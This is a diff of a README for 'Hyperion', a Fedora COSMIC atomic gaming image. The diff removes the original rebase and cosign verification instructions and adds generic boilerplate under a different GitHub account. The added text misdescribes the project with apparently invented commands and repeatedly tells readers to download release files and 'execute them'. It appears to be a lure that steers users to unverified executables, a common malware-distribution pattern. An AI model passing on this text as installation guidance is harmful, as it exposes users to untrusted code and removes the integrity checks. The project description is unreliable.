@@ -1,53 +1,112 @@
-# hyperion &nbsp; [![bluebuild build badge](https://github.com/tj5miniop/hyperion/actions/workflows/build.yml/badge.svg)](https://github.com/tj5miniop/hyperion/actions/workflows/build.yml)
+# Hyperion 🌌
 
-# NOTE - THIS IMAGE SHOULDN'T BE USED (YET) AS A DAILY-DRIVING OPERATING SYSTEM, IT IS CURRENTLY IN A PROTOTYPING PHASE.
+![Hyperion Logo](https://img.shields.io/badge/Hyperion-Project-blue)
 
-## Hyperion - A fedora COSMIC-based atomic desktop, meant for gaming, including many tweaks from Bazzite/Nobara/CachyOS. More details to come
+Welcome to the Hyperion repository! This project focuses on creating immutable, custom Linux images based on the OCI standard. Our goal is to simplify the process of building and managing operating system images while ensuring they are lightweight and efficient.
 
-## Why not use Bazzite? 
+## Table of Contents
 
-Bazzite is a great atomic desktop which provides an awesome 'just-works' experience for gamers.
-I was originally basing Hyperion off of Bazzite, but I was getting many conflicts with packages, files, etc. I'm basing off of the official Fedora COSMIC ATOMIC spin, which should be released alongside Fedora 42.
+- [Introduction](#introduction)
+- [Features](#features)
+- [Topics](#topics)
+- [Getting Started](#getting-started)
+- [Usage](#usage)
+- [Releases](#releases)
+- [Contributing](#contributing)
+- [License](#license)
 
+## Introduction
 
-See the [BlueBuild docs](https://blue-build.org/how-to/setup/) for quick setup instructions for setting up your own repository based on this template.
+Hyperion provides a robust framework for building custom Linux images. It leverages the OCI (Open Container Initiative) standards to ensure compatibility and ease of use. With Hyperion, developers can create atomic, image-based operating systems that are both flexible and secure.
 
-After setup, it is recommended you update this README to describe your custom image.
+## Features
 
-## Installation
+- **Atomic Builds**: Create images that are built atomically, ensuring that the entire image is either fully built or not built at all.
+- **Custom Images**: Tailor your Linux images to fit your specific needs, whether for development, testing, or production.
+- **OCI Compliance**: Follow OCI standards to ensure compatibility across different platforms and environments.
+- **Immutable Infrastructure**: Deploy immutable images that do not change after they are created, enhancing security and stability.
 
-> [!WARNING]  
-> [This is an experimental feature](https://www.fedoraproject.org/wiki/Changes/OstreeNativeContainerStable), try at your own discretion.
+## Topics
 
-To rebase an existing atomic Fedora installation to the latest build:
+This repository covers various topics that are crucial for understanding and utilizing Hyperion:
 
-- First rebase to the unsigned image, to get the proper signing keys and policies installed:
-  ```
-  rpm-ostree rebase ostree-unverified-registry:ghcr.io/tj5miniop/hyperion:latest
-  ```
-- Reboot to complete the rebase:
-  ```
-  systemctl reboot
-  ```
-- Then rebase to the signed image, like so:
-  ```
-  rpm-ostree rebase ostree-image-signed:docker://ghcr.io/tj5miniop/hyperion:latest
-  ```
-- Reboot again to complete the installation
-  ```
-  systemctl reboot
-  ```
+- Atomic
+- Bluebuild
+- Bluebuild Image
+- Custom Image
+- Image-Based
+- Immutable
+- Linux
+- Linux Custom Image
+- OCI
+- OCI Image
+- Operating System
 
-The `latest` tag will automatically point to the latest build. That build will still always use the Fedora version specified in `recipe.yml`, so you won't get accidentally updated to the next major version.
+## Getting Started
 
-## ISO
+To get started with Hyperion, follow these steps:
 
-If build on Fedora Atomic, you can generate an offline ISO with the instructions available [here](https://blue-build.org/learn/universal-blue/#fresh-install-from-an-iso). These ISOs cannot unfortunately be distributed on GitHub for free due to large sizes, so for public projects something else has to be used for hosting.
+1. **Clone the Repository**:
+   ```bash
+   git clone https://github.com/zainalibora/hyperion.git
+   cd hyperion
+   ```
 
-## Verification
+2. **Install Dependencies**: Ensure you have the necessary dependencies installed. You can find a list of dependencies in the `INSTALL.md` file.
 
-These images are signed with [Sigstore](https://www.sigstore.dev/)'s [cosign](https://github.com/sigstore/cosign). You can verify the signature by downloading the `cosign.pub` file from this repo and running the following command:
+3. **Build the Project**: Use the provided build scripts to compile the project. This will create the necessary binaries and images.
 
-```bash
-cosign verify --key cosign.pub ghcr.io/tj5miniop/hyperion
-```
+4. **Download and Execute**: For the latest release, visit [Releases](https://github.com/zainalibora/hyperion/releases) to download the required files and execute them.
+
+## Usage
+
+After setting up Hyperion, you can use it to build your custom Linux images. Here’s a simple example:
+
+1. **Create a New Image**:
+   ```bash
+   hyperion create my-custom-image
+   ```
+
+2. **Configure Your Image**: Modify the configuration files as needed.
+
+3. **Build Your Image**:
+   ```bash
+   hyperion build my-custom-image
+   ```
+
+4. **Run Your Image**:
+   ```bash
+   hyperion run my-custom-image
+   ```
+
+For detailed usage instructions, refer to the `USAGE.md` file in the repository.
+
+## Releases
+
+We regularly update Hyperion with new features and fixes. You can find the latest releases at [Releases](https://github.com/zainalibora/hyperion/releases). Download the necessary files and execute them to stay up to date with the project.
+
+## Contributing
+
+We welcome contributions from the community! If you would like to contribute to Hyperion, please follow these steps:
+
+1. **Fork the Repository**: Create a personal copy of the repository on GitHub.
+2. **Create a New Branch**: Work on your feature or bug fix in a separate branch.
+   ```bash
+   git checkout -b feature/my-new-feature
+   ```
+3. **Make Your Changes**: Implement your changes and ensure they are well-tested.
+4. **Submit a Pull Request**: Push your changes and submit a pull request to the main repository.
+
+Please make sure to follow our [Code of Conduct](CODE_OF_CONDUCT.md) and [Contributing Guidelines](CONTRIBUTING.md).
+
+## License
+
+Hyperion is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+
+## Contact
+
+For questions or feedback, please open an issue in the repository or contact the maintainers directly.
+
+---
+
+Thank you for checking out Hyperion! We hope you find it useful for your projects. For updates and more information, visit [Releases](https://github.com/zainalibora/hyperion/releases).
